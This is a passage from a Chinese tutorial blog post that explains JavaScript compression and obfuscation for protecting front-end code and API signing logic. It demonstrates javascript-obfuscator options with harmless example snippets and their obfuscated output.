                    <li>JavaScript 代码运行于客户端，也就是它必须要在用户浏览器端加载并运行。</li>
                    <li>JavaScript 代码是公开透明的，也就是说浏览器可以直接获取到正在运行的 JavaScript 的源码。</li>
                  </ul>
                  <p>由于这两个原因，至使 JavaScript 代码是不安全的，任何人都可以读、分析、复制、盗用，甚至篡改。</p>
                  <p>所以说，对于上述情形，客户端 JavaScript 对于某些加密的实现是很容易被找到或模拟的，了解了加密逻辑后，模拟参数的构造和请求也就是轻而易举了，所以如果 JavaScript 没有做任何层面的保护的话，接口加密技术基本上对数据起不到什么防护作用。</p>
                  <p>如果你不想让自己的数据被轻易获取，不想他人了解 JavaScript 逻辑的实现，或者想降低被不怀好意的人甚至是黑客攻击。那么就需要用到 JavaScript 压缩、混淆和加密技术了。</p>
                  <p>这里压缩、混淆和加密技术简述如下：</p>
                  <ul>
                    <li>代码压缩：即去除 JavaScript 代码中的不必要的空格、换行等内容，使源码都压缩为几行内容，降低代码可读性，当然同时也能提高网站的加载速度。</li>
                  </ul>
                  <ul>
                    <li>代码混淆：使用变量替换、字符串阵列化、控制流平坦化、多态变异、僵尸函数、调试保护等手段，使代码变地难以阅读和分析，达到最终保护的目的。但这不影响代码原有功能。是理想、实用的 JavaScript 保护方案。</li>
                    <li>代码加密：可以通过某种手段将 JavaScript 代码进行加密，转成人无法阅读或者解析的代码，如借用 WebAssembly 技术，可以直接将 JavaScript 代码用 C/C++ 实现，JavaScript 调用其编译后形成的文件来执行相应的功能。</li>
                  </ul>
                  <p>下面我们对上面的技术分别予以介绍。</p>
                  <h2 id="3-URL-API-参数加密"><a href="#3-URL-API-参数加密" class="headerlink" title="3. URL/API 参数加密"></a>3. URL/API 参数加密</h2>
                  <p>现在绝大多数网站的数据一般都是通过服务器提供的 API 来获取的，网站或 App 可以请求某个数据 API 获取到对应的数据，然后再把获取的数据展示出来。但有些数据是比较宝贵或私密的，这些数据肯定是需要一定层面上的保护。所以不同 API 的实现也就对应着不同的安全防护级别，我们这里来总结下。</p>
                  <p>为了提升接口的安全性，客户端会和服务端约定一种接口校验方式，一般来说会使用到各种加密和编码算法，如 Base64、Hex 编码，MD5、AES、DES、RSA 等对称或非对称加密。</p>
                  <p>举个例子，比如说客户端和服务器双方约定一个 sign 用作接口的签名校验，其生成逻辑是客户端将 URL Path 进行 MD5 加密然后拼接上 URL 的某个参数再进行 Base64 编码，最后得到一个字符串 sign，这个 sign 会通过 Request URL 的某个参数或 Request Headers 发送给服务器。服务器接收到请求后，对 URL Path 同样进行 MD5 加密，然后拼接上 URL 的某个参数，也进行 Base64 编码也得到了一个 sign，然后比对生成的 sign 和客户端发来的 sign 是否是一致的，如果是一致的，那就返回正确的结果，否则拒绝响应。这就是一个比较简单的接口参数加密的实现。如果有人想要调用这个接口的话，必须要定义好 sign 的生成逻辑，否则是无法正常调用接口的。</p>
                  <p>当然上面的这个实现思路比较简单，这里还可以增加一些时间戳信息增加时效性判断，或增加一些非对称加密进一步提高加密的复杂程度。但不管怎样，只要客户端和服务器约定好了加密和校验逻辑，任何形式加密算法都是可以的。</p>
                  <p>这里要实现接口参数加密就需要用到一些加密算法，客户端和服务器肯定也都有对应的 SDK 实现这些加密算法，如 JavaScript 的 crypto-js，Python 的 hashlib、Crypto 等等。</p>
                  <p>但还是如上文所说，如果是网页的话，客户端实现加密逻辑如果是用 JavaScript 来实现，其源代码对用户是完全可见的，如果没有对 JavaScript 做任何保护的话，是很容易弄清楚客户端加密的流程的。</p>
                  <p>因此，我们需要对 JavaScript 利用压缩、混淆等方式来对客户端的逻辑进行一定程度上的保护。</p>
                  <h2 id="4-JavaScript-压缩"><a href="#4-JavaScript-压缩" class="headerlink" title="4. JavaScript 压缩"></a>4. JavaScript 压缩</h2>
                  <p>这个非常简单，JavaScript 压缩即去除 JavaScript 代码中的不必要的空格、换行等内容或者把一些可能公用的代码进行处理实现共享，最后输出的结果都压缩为几行内容，代码可读性变得很差，同时也能提高网站加载速度。</p>
                  <p>如果仅仅是去除空格换行这样的压缩方式，其实几乎是没有任何防护作用的，因为这种压缩方式仅仅是降低了代码的直接可读性。如果我们有一些格式化工具可以轻松将 JavaScript 代码变得易读，比如利用 IDE、在线工具或 Chrome 浏览器都能还原格式化的代码。</p>
                  <p>比如这里举一个最简单的 JavaScript 压缩示例，原来的 JavaScript 代码是这样的：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params">stringA, stringB</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">"Germey"</span>;</span><br><span class="line">  alert(<span class="string">"hello "</span> + name);</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>压缩之后就变成这样子：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params">d, c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> e = <span class="string">"Germey"</span>;</span><br><span class="line">  alert(<span class="string">"hello "</span> + e);</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这里参数的名称都被简化了，代码中的空格也被去掉了，整个代码也被压缩成了一行，代码的整体可读性降低了。</p>
                  <p>目前主流的前端开发技术大多都会利用 Webpack、Rollup 等工具进行打包，Webpack、Rollup 会对源代码进行编译和压缩，输出几个打包好的 JavaScript 文件，其中我们可以看到输出的 JavaScript 文件名带有一些不规则字符串，同时文件内容可能只有几行内容，变量名都是一些简单字母表示。这其中就包含 JavaScript 压缩技术，比如一些公共的库输出成 bundle 文件，一些调用逻辑压缩和转义成冗长的几行代码，这些都属于 JavaScript 压缩。另外其中也包含了一些很基础的 JavaScript 混淆技术，比如把变量名、方法名替换成一些简单字符，降低代码可读性。</p>
                  <p>但整体来说，JavaScript 压缩技术只能在很小的程度上起到防护作用，要想真正提高防护效果还得依靠 JavaScript 混淆和加密技术。</p>
                  <h2 id="5-JavaScript-混淆"><a href="#5-JavaScript-混淆" class="headerlink" title="5. JavaScript 混淆"></a>5. JavaScript 混淆</h2>
                  <p>JavaScript 混淆是完全是在 JavaScript 上面进行的处理，它的目的就是使得 JavaScript 变得难以阅读和分析，大大降低代码可读性，是一种很实用的 JavaScript 保护方案。</p>
                  <p>JavaScript 混淆技术主要有以下几种：</p>
                  <ul>
                    <li>
                      <p>变量混淆：将带有含义的变量名、方法名、常量名随机变为无意义的类乱码字符串，降低代码可读性，如转成单个字符或十六进制字符串。</p>
                    </li>
                    <li>
                      <p>字符串混淆：将字符串阵列化集中放置、并可进行 MD5 或 Base64 加密存储，使代码中不出现明文字符串，这样可以避免使用全局搜索字符串的方式定位到入口点。</p>
                    </li>
                    <li>
                      <p>属性加密：针对 JavaScript 对象的属性进行加密转化，隐藏代码之间的调用关系。</p>
                    </li>
                    <li>
                      <p>控制流平坦化：打乱函数原有代码执行流程及函数调用关系，使代码逻变得混乱无序。</p>
                    </li>
                    <li>
                      <p>无用代码注入：随机在代码中插入不会被执行到的无用代码，进一步使代码看起来更加混乱。</p>
                    </li>
                    <li>
                      <p>调试保护：基于调试器特性，对当前运行环境进行检验，加入一些强制调试 debugger 语句，使其在调试模式下难以顺利执行 JavaScript 代码。</p>
                    </li>
                    <li>
                      <p>多态变异：使 JavaScript 代码每次被调用时，将代码自身即立刻自动发生变异，变化为与之前完全不同的代码，即功能完全不变，只是代码形式变异，以此杜绝代码被动态分析调试。</p>
                    </li>
                    <li>
                      <p>锁定域名：使 JavaScript 代码只能在指定域名下执行。</p>
                    </li>
                    <li>
                      <p>反格式化：如果对 JavaScript 代码进行格式化，则无法执行，导致浏览器假死。</p>
                    </li>
                    <li>
                      <p>特殊编码：将 JavaScript 完全编码为人不可读的代码，如表情符号、特殊表示内容等等。</p>
                    </li>
                  </ul>
                  <p>总之，以上方案都是 JavaScript 混淆的实现方式，可以在不同程度上保护 JavaScript 代码。</p>
                  <p>在前端开发中，现在 JavaScript 混淆主流的实现是 javascript-obfuscator (<a href="https://github.com/javascript-obfuscator/javascript-obfuscator" target="_blank" rel="noopener">https://github.com/javascript-obfuscator/javascript-obfuscator</a>) 和 terser (<a href="https://github.com/terser/terser" target="_blank" rel="noopener">https://github.com/terser/terser</a>) 这两个库，其都能提供一些代码混淆功能，也都有对应的 Webpack 和 Rollup 打包工具的插件，利用它们我们可以非常方便地实现页面的混淆，最终可以输出压缩和混淆后的 JavaScript 代码，使得 JavaScript 代码可读性大大降低。</p>
                  <p>下面我们以 javascript-obfuscator 为例来介绍一些代码混淆的实现，了解了实现，那么自然我们就对混淆的机理有了更加深刻的认识。</p>
                  <p>javascript-obfuscator 的官网地址为：<a href="https://obfuscator.io/，其官方介绍内容如下：" target="_blank" rel="noopener">https://obfuscator.io/，其官方介绍内容如下：</a></p>
                  <blockquote>
                    <p>A free and efficient obfuscator for JavaScript (including ES2017). Make your code harder to copy and prevent people from stealing your work.</p>
                  </blockquote>
                  <p>它是支持 ES8 的免费、高效的 JavaScript 混淆库，它可以使得你的 JavaScript 代码经过混淆后难以被复制、盗用，混淆后的代码具有和原来的代码一模一样的功能。</p>
                  <p>怎么使用呢？首先，我们需要安装好 Node.js 12.x 版本及以上，确保可以正常使用 npm 命令，具体的安装方式可以参考：<a href="https://setup.scrape.center/nodejs。" target="_blank" rel="noopener">https://setup.scrape.center/nodejs。</a></p>
                  <p>接着新建一个文件夹，比如 js-obfuscate，然后进入该文件夹，初始化工作空间：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm init</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里会提示我们输入一些信息，创建一个 package.json 文件，这就完成了项目初始化了。</p>
                  <p>接下来我们来安装 javascript-obfuscator 这个库：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm i -D javascript-obfuscator</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，即可看到本地 js-obfuscate 文件夹下生成了一个 node_modules 文件夹，里面就包含了 javascript-obfuscator 这个库，这就说明安装成功了，文件夹结构如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/viunz.png" alt="image-20210612155500985"></p>
                  <p>接下来我们就可以编写代码来实现一个混淆样例了，如新建一个 main.js 文件，内容如下：</p>
                  <figure class="highlight js">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let x = '1' + 1</span></span><br><span class="line"><span class="string">console.log('x', x)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  controlFlowFlattening: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obfuscator = <span class="built_in">require</span>(<span class="string">"javascript-obfuscator"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params">code, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obfuscator.obfuscate(code, options).getObfuscatedCode();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obfuscate(code, options));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里我们定义了两个变量，一个是 code，即需要被混淆的代码，另一个是混淆选项，是一个 Object。接下来我们引入了 javascript-obfuscator 这库，然后定义了一个方法，传入 code 和 options，来获取混淆后的代码，最后控制台输出混淆后的代码。</p>
                  <p>代码逻辑比较简单，我们来执行一下代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">node main.js</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>输出结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x53bf = [<span class="string">"log"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x1d84fe, _0x3aeda0</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x10a5a = <span class="function"><span class="keyword">function</span> (<span class="params">_0x2f0a52</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x2f0a52) &#123;</span><br><span class="line">      _0x1d84fe[<span class="string">"push"</span>](_0x1d84fe[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x10a5a(++_0x3aeda0);</span><br><span class="line">&#125;)(_0x53bf, <span class="number">0x172</span>);</span><br><span class="line"><span class="keyword">var</span> _0x480a = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4341e5, _0x5923b4</span>) </span>&#123;</span><br><span class="line">  _0x4341e5 = _0x4341e5 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0xb3622e = _0x53bf[_0x4341e5];</span><br><span class="line">  <span class="keyword">return</span> _0xb3622e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> x = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[_0x480a(<span class="string">"0x0"</span>)](<span class="string">"x"</span>, x);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>看到了吧，那么简单的两行代码，被我们混淆成了这个样子，其实这里我们就是设定了一个「控制流平坦化」的选项。整体看来，代码的可读性大大降低，也大大加大了 JavaScript 调试的难度。</p>
                  <p>好，那么我们来跟着 javascript-obfuscator 走一遍，就能具体知道 JavaScript 混淆到底有多少方法了。</p>
                  <blockquote>
                    <p>注意：由于这些例子中，调用 javascript-obfuscator 进行混淆的实现是一样的，所以下文的示例只说明 code 和 options 变量的修改，完整代码请自行补全。</p>
                  </blockquote>
                  <h3 id="代码压缩"><a href="#代码压缩" class="headerlink" title="代码压缩"></a>代码压缩</h3>
                  <p>这里 javascript-obfuscator 也提供了代码压缩的功能，使用其参数 compact 即可完成 JavaScript 代码的压缩，输出为一行内容。默认是 true，如果定义为 false，则混淆后的代码会分行显示。</p>
                  <p>示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let x = '1' + 1</span></span><br><span class="line"><span class="string">console.log('x', x)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们先把代码压缩 compact 选项设置为 false，运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">let</span> x = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[<span class="string">"log"</span>](<span class="string">"x"</span>, x);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果不设置 compact 或把 compact 设置为 true，结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x151c = [<span class="string">"log"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x1ce384, _0x20a7c7</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x25fc92 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x188aec</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x188aec) &#123;</span><br><span class="line">      _0x1ce384[<span class="string">"push"</span>](_0x1ce384[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x25fc92(++_0x20a7c7);</span><br><span class="line">&#125;)(_0x151c, <span class="number">0x1b7</span>);</span><br><span class="line"><span class="keyword">var</span> _0x553e = <span class="function"><span class="keyword">function</span> (<span class="params">_0x259219, _0x241445</span>) </span>&#123;</span><br><span class="line">  _0x259219 = _0x259219 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x56d72d = _0x151c[_0x259219];</span><br><span class="line">  <span class="keyword">return</span> _0x56d72d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> x = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[_0x553e(<span class="string">"0x0"</span>)](<span class="string">"x"</span>, x);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到单行显示的时候，对变量名进行了进一步的混淆，这里变量的命名都变成了 16 进制形式的字符串，这是因为启用了一些默认压缩和混淆配置导致的。总之我们可以看到代码的可读性相比之前大大降低了。</p>
                  <h3 id="变量名混淆"><a href="#变量名混淆" class="headerlink" title="变量名混淆"></a>变量名混淆</h3>
                  <p>变量名混淆可以通过在 javascript-obfuscator 中配置 identifierNamesGenerator 参数实现，我们通过这个参数可以控制变量名混淆的方式，如 hexadecimal 则会替换为 16 进制形式的字符串，在这里我们可以设定如下值：</p>
                  <ul>
                    <li>hexadecimal：将变量名替换为 16 进制形式的字符串，如 <code>0xabc123</code>。</li>
                    <li>mangled：将变量名替换为普通的简写字符，如 <code>a</code>、<code>b</code>、<code>c</code> 等。</li>
                  </ul>
                  <p>该参数的值默认为 hexadecimal。</p>
                  <p>我们将该参数修改为 mangled 来试一下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let hello = '1' + 1</span></span><br><span class="line"><span class="string">console.log('hello', hello)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">true</span>,</span><br><span class="line">  identifierNamesGenerator: <span class="string">"mangled"</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> a = [<span class="string">"hello"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> e = <span class="function"><span class="keyword">function</span> (<span class="params">f</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--f) &#123;</span><br><span class="line">      c[<span class="string">"push"</span>](c[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  e(++d);</span><br><span class="line">&#125;)(a, <span class="number">0x9b</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span> (<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">  c = c - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> e = a[c];</span><br><span class="line">  <span class="keyword">return</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> hello = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[<span class="string">"log"</span>](b(<span class="string">"0x0"</span>), hello);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这里的变量命名都变成了 <code>a</code>、<code>b</code> 等形式。</p>
                  <p>如果我们将 identifierNamesGenerator 修改为 hexadecimal 或者不设置，运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x4e98 = [<span class="string">"log"</span>, <span class="string">"hello"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x4464de, _0x39de6c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0xdffdda = <span class="function"><span class="keyword">function</span> (<span class="params">_0x6a95d5</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x6a95d5) &#123;</span><br><span class="line">      _0x4464de[<span class="string">"push"</span>](_0x4464de[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0xdffdda(++_0x39de6c);</span><br><span class="line">&#125;)(_0x4e98, <span class="number">0xc8</span>);</span><br><span class="line"><span class="keyword">var</span> _0x53cb = <span class="function"><span class="keyword">function</span> (<span class="params">_0x393bda, _0x8504e7</span>) </span>&#123;</span><br><span class="line">  _0x393bda = _0x393bda - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x46ab80 = _0x4e98[_0x393bda];</span><br><span class="line">  <span class="keyword">return</span> _0x46ab80;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> hello = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[_0x53cb(<span class="string">"0x0"</span>)](_0x53cb(<span class="string">"0x1"</span>), hello);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到选用了 mangled，其代码体积会更小，但 hexadecimal 其可读性会更低。</p>
                  <p>另外我们还可以通过设置 identifiersPrefix 参数来控制混淆后的变量前缀，示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let hello = '1' + 1</span></span><br><span class="line"><span class="string">console.log('hello', hello)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  identifiersPrefix: <span class="string">"germey"</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> germey_0x3dea = [<span class="string">"log"</span>, <span class="string">"hello"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x348ff3, _0x5330e8</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x1568b1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4740d8</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x4740d8) &#123;</span><br><span class="line">      _0x348ff3[<span class="string">"push"</span>](_0x348ff3[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x1568b1(++_0x5330e8);</span><br><span class="line">&#125;)(germey_0x3dea, <span class="number">0x94</span>);</span><br><span class="line"><span class="keyword">var</span> germey_0x30e4 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x2e8f7c, _0x1066a8</span>) </span>&#123;</span><br><span class="line">  _0x2e8f7c = _0x2e8f7c - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x5166ba = germey_0x3dea[_0x2e8f7c];</span><br><span class="line">  <span class="keyword">return</span> _0x5166ba;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> hello = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[germey_0x30e4(<span class="string">"0x0"</span>)](germey_0x30e4(<span class="string">"0x1"</span>), hello);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到混淆后的变量前缀加上了我们自定义的字符串 germey。</p>
                  <p>另外 renameGlobals 这个参数还可以指定是否混淆全局变量和函数名称，默认为 false。示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">var $ = function(id) &#123;</span></span><br><span class="line"><span class="string">    return document.getElementById(id);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  renameGlobals: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x4864b0 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5763be</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>[<span class="string">"getElementById"</span>](_0x5763be);</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这里我们声明了一个全局变量 <script type="math/tex">`，在 renameGlobals 设置为 true 之后，`</script> 这个变量也被替换了。如果后文用到了这个 <code>$</code> 对象，可能就会有找不到定义的错误，因此这个参数可能导致代码执行不通。</p>
                  <p>如果我们不设置 renameGlobals 或者设置为 false，结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
